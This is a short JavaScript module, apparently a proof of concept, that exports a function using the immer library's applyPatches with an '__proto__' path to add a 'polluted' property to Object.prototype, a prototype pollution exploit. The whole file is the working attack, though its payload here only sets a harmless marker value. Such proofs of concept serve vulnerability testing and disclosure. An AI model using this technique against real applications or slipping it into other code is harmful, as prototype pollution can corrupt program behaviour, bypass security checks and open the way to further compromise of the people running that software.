function exploitFunction(payload) {
  const { applyPatches, enablePatches } = require("immer");
  enablePatches();
  applyPatches(payload, [
    { op: "add", path: ["__proto__", "polluted"], value: "yes" },
  ]);
}

module.exports = { exploitFunction };